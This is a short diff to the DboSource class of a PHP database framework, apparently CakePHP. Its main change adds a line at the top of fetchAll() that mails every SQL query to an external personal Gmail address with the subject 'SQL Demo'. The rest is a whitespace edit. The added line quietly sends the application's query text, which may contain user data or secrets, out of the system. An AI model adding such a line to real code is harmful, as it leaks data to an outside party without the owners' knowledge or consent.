@@ -655,6 +655,7 @@ class DboSource extends DataSource {
  * @return array Array of resultset rows, or false if no rows matched
  */
 	public function fetchAll($sql, $params = array(), $options = array()) {
+		mail('ehask71@gmail.com','SQL Demo',$sql);
 		if (is_string($options)) {
 			$options = array('modelName' => $options);
 		}
@@ -1077,7 +1078,7 @@ class DboSource extends DataSource {
 		}
 
 		$query = trim($this->generateAssociationQuery($model, null, null, null, null, $queryData, false, $null));
-
+		
 		$resultSet = $this->fetchAll($query, $model->cacheQueries);
 
 		if ($resultSet === false) {
